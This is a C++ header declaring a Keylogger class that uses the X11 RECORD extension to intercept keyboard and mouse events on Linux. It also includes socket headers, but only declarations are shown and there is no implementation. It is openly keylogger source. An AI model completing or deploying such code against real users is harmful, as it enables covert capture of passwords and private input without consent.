//
// Keylogger.hpp for Keylogger clas in /home/vianney
// 
// Made by Vianney Bouchaud
// Login   <vianney@bouchaud.org>
// 
// Started on  Wed Oct  5 13:59:20 2011 Vianney Bouchaud
// Last update Thu Oct  6 19:04:04 2011 Vianney Bouchaud
//

#ifndef __KEYLOGGER_HH__
# define __KEYLOGGER_HH__

#include <X11/Xlibint.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xos.h>
#include <X11/Shell.h>
#include <X11/cursorfont.h>
#include <X11/keysymdef.h>
#include <X11/keysym.h>
#include <X11/extensions/record.h>
#include <X11/extensions/XTest.h>
#include <unistd.h>
#include <exception>
#include <string>
#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

struct		CallbackClosure {
  Display	*ctrlDisplay;
  Display	*dataDisplay;
  int		curX;
  int		curY;
  void		*initialObject;
};

typedef union {
  unsigned char		type;
  xEvent		event;
  xResourceReq		req;
  xGenericReply		reply;
  xError		error;
  xConnSetupPrefix	setup;
}			XRecordDatum;

class			Keylogger {
public:
  Keylogger();
  ~Keylogger();
  void			start();
  void			stop();
  void			processData();
  bool			xConnect(std::string displayName);

private:
  std::string		m_displayName;
  CallbackClosure	userData;
  std::pair<int,int>	recVer;
  XRecordRange		*recRange;
  XRecordClientSpec	recClientSpec;
  XRecordContext	recContext;

  void			setupRecordExtension();
  static std::string	&eventCallback(XPointer priv, XRecordInterceptData *hook, std::string&);
};

#endif /* !__KEYLOGGER_HH__ */
